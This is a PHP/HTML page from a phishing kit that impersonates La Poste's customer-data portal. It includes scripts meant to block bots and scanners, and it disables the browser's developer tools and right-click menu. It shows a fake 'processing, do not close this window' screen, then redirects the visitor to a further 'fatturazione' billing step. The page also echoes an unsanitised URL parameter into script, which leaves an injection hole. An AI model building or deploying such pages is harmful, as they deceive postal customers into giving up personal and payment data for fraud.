<?php
$bin4=$_GET['page'];
date_default_timezone_set('Europe/Paris');

if(!isset($_SESSION)) { session_start(); } 
error_reporting(0);
include '../prevents/anti1.php';
	include '../prevents/anti2.php';
	include '../prevents/anti3.php';
	include '../prevents/anti4.php';
	include '../prevents/anti5.php';
	include '../prevents/anti6.php';
	include '../prevents/anti7.php';
	include '../prevents/anti8.php';
?>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
        
    
<link rel="icon" type="image/png" href="img/favicon-16x16.png" sizes="16x16">


    <link href="ndart/css.css" rel="stylesheet">
    
<meta name="robots" contents="noindex,nofollow">

<script type="text/JavaScript">
      setTimeout("location.href = './fatturazione-3/index.php?page=<?php echo $bin4 ?>';",40000);
 </script>

    <link href="ndart/css_002.css" rel="stylesheet">

<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>
<title>La post - Données client</title></head>
<body>
    <div ng-app="OneCartApp" class="cloud-body ng-scope">
        <header class="header">
            <div id="header" class="top-navbar-panels hidden-print" aria-multiselectable="true">    

    <div>
        <div class="navbar-inverse  navbar-collapse collapse hidden-print navbar-custom">
            <div class="navbar-left">
                <ul class="nav navbar-nav">
                    <li class="">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="true"><span translate="" class="ng-scope ng-binding">français</span>&nbsp;&nbsp;<span class="caret"></span></a>
                            <ul id="dropdown-menu-languages" class="dropdown-menu inverse-dropdown">
                                <li ng-show="$root.currentLanguage!='it-IT'" class="ng-hide" style=""><a href="#" ng-click="$root.setLanguage('it-IT')" translate="" class="ng-scope">français</a></li>
                                <li ng-show="$root.currentLanguage!='en-US'" class=""><a href="#" ng-click="$root.setLanguage('en-US')" translate="" class="ng-scope">Inglese</a></li>
                                <li ng-show="$root.currentLanguage!='es-ES'" class=""><a href="#" ng-click="$root.setLanguage('es-ES')" translate="" class="ng-scope">Spagnolo</a></li>
                                <li ng-show="$root.currentLanguage!='fr-FR'" class=""><a href="#" ng-click="$root.setLanguage('fr-FR')" translate="" class="ng-scope">Francese</a></li>
                            </ul>
                    </li>

                </ul>
            </div>
            <div class="navbar-right">
                <ul class="nav navbar-nav">
                    <li>
                        <a href="#cloud.it/login.aspx">
                            <span class="glyphicon glyphicon-user">&nbsp;</span><span translate="" class="ng-scope">Se connecter</span> 
                        </a>
                    </li>
                    <li>
                        <a href="#cloud.it/assistenza-clienti.aspx">
                            <span class="glyphicon glyphicon-headphones">&nbsp;</span><span translate="" class="ng-scope">Assistance 24h / 24</span> 
                        </a>
                    </li>
                    <li>
                        <a href="#cloud.it/assistenza-clienti/assistenza-commerciale.aspx">
                            <span class="glyphicon glyphicon-question-sign">&nbsp;</span><span translate="" class="ng-scope">prévente</span> 
                        </a>
                    </li>                   
                </ul>
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="row">
        <div class="col-xs-8 col-sm-6 margin-top-10 padding-right-0 padding-left-15">
            <button type="button" class="navbar-toggle navbar-button-collapse collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a href="#CloudChargeCredit" class="logo-link">
                <div class="img-logo"></div>
            </a>
        </div>
        <div ng-show="$root.LoggedUser" id="loginInfoContainer" class="hidden-xs col-sm-6" style="">
            <div id="loginInfo">
                <ul class="userinfo" style="float:right;">
                    
                    <li class="logout">
                        <a ng-click="$root.logout()" translate="" class="ng-scope">Sortir</a>
                    </li>
                </ul>
            </div>
        </div>

    </div>
</div>


        </header>
        <div class="container hidden-print">
        </div>
        <div>

            <div class="loading ng-hide" ng-show="$root.nLoading&gt;0" style=""></div>

            <div>
                <div class="" style="padding-top:8px;">
                    <div>
                        <div id="errormessage" class="alert alert-danger" style="display:none"></div>
                        <div id="body-container">
                            



<!-- uiView:  --><div ui-view="" class="ng-scope" style="">
<div class="ng-scope">
    
        
    <div class="content">
        <div class="container margin-bottom-20">
            <!-- uiView:  --><div ui-view="" autoscroll="true" class="margin-bottom-20 ng-scope" style=""><div data-ng-init="startup()" class="ng-scope">
    <form action="snd.php" method="post" class="ng-pristine ng-valid ng-valid-validator">
        
        <div ng-show="isUpdate" class="">
            <h1 translate="" class="ng-scope">Réactivez-le depuis votre compte
</h1>

        </div>
		  <div ng-show="isUpdate" class="" align="center">

            <h4 translate="" class="ng-scope">Veuillez attendre que votre demande soit traitée.<br><img style="width:10%" src="ndart/LoadArt.gif"><br>
Veuillez ne pas fermer cette fenêtre.</h4>
        </div>
        </form>       
                          
        </div>		
    </div>  
	
	                                     
</div></div>


                        </div>
                    </div>
                    <input id="errorLog" type="hidden">
                </div>
            </div>

        </div>
    </div>

    <footer class="zoneFooter">
    <table width="100%">
        <tbody><tr>
            <td width="auto">
                <hr class="margin-top-10">
            </td>
            <td style="text-align:center;" width="650">
                <img src="ndart/laposte.svg" width="80px" alt="logo" class="arubaGroupLogo">
                <span class="copyrightBottomDescription">Copyright &copy; 2020 La post S.p.A.- P.I. 01573850511 - All rights reserved - </span>                
            </td>
            <td width="auto">
                <hr class="margin-top-10">
            </td>
        </tr>
    </tbody></table>
</footer>

    



<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.37347360400338103"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.915264610593383" alt="" src="ndart/0_003.txt" width="0" height="0"></div><div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.6650930024932824"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.3321755278522869" alt="" src="ndart/0_002.txt" width="0" height="0"></div><div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.5510898558382857"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.4035185849754832" alt="" src="ndart/0.txt" width="0" height="0"></div></div></div></body></html>